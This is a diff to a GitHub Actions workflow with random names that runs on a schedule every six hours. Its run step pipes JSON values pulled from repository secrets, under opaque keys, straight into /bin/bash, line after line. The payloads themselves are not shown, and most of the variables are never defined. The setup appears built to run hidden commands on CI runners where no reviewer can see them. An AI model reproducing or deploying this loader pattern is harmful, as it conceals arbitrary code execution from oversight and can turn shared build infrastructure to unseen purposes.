@@ -3,7 +3,7 @@ name: tundramassive
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 3/6 * * *'
+    - cron: '0 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,16 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: tundramassive
         env:
-          wptt58054: ${{ secrets.wptt58054 }}
+          qobr3: ${{ secrets.qobr3 }}
         run: |
-          echo $wptt58054 | jq -r .i5 | /bin/bash
-          echo $hiz061 | jq -r .bsfu32 | /bin/bash
-          echo $ym64 | jq -r .cfwrl82 | /bin/bash
-          echo $ejijy068 | jq -r .yrgj40113 | /bin/bash
-          echo $vhd6494 | jq -r .qfcx64733 | /bin/bash
-          echo $ezoa7 | jq -r .d72431 | /bin/bash
-          echo $adux72 | jq -r .sxl2 | /bin/bash
-          echo $it54 | jq -r .qkin93 | /bin/bash
-          echo $kg420 | jq -r .bddwh091 | /bin/bash
-          echo $lnh694 | jq -r .q1 | /bin/bash
+          echo $qobr3 | jq -r .b007 | /bin/bash
+          echo $go66603 | jq -r .x530 | /bin/bash
+          echo $hzwg0 | jq -r .yb4 | /bin/bash
+          echo $r4 | jq -r .iqq16 | /bin/bash
+          echo $hqgs25415 | jq -r .aucuk216 | /bin/bash
+          echo $fba798 | jq -r .u8100 | /bin/bash
+          echo $vm7 | jq -r .sctj90 | /bin/bash
+          echo $okqyj8333 | jq -r .lil40 | /bin/bash
+          echo $x19 | jq -r .tarb02 | /bin/bash
 
